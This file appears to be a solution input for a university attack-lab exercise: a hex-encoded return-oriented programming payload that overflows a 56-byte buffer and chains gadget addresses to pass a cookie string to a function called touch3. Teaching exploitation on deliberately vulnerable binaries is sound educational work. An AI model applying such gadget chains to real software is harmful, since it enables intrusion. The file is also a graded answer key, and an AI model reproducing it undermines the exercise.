00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 56 bytes buffer */
92 28 40 00 00 00 00 00 /* mov %rsp, %rax */
54 28 40 00 00 00 00 00 /* mov %rax, %rdi */
34 28 40 00 00 00 00 00 /* pop %rax */
00 00 00 00 00 00 00 00 /* %rsp offset */
89 28 40 00 00 00 00 00 /* mov %eax, %edx */
88 29 40 00 00 00 00 00 /* mov %edx, %ecx */
C5 28 40 00 00 00 00 00 /* mov %ecx, %esi */
67 28 40 00 00 00 00 00 /* lea (%rdi, %rsi, 1),%rax */
54 28 40 00 00 00 00 00 /* mov %rax, %rdi */
5C 27 40 00 00 00 00 00 /* touch3 little endian addr */
37 36 65 62 64 62 35 36 /* cookie ascii string */
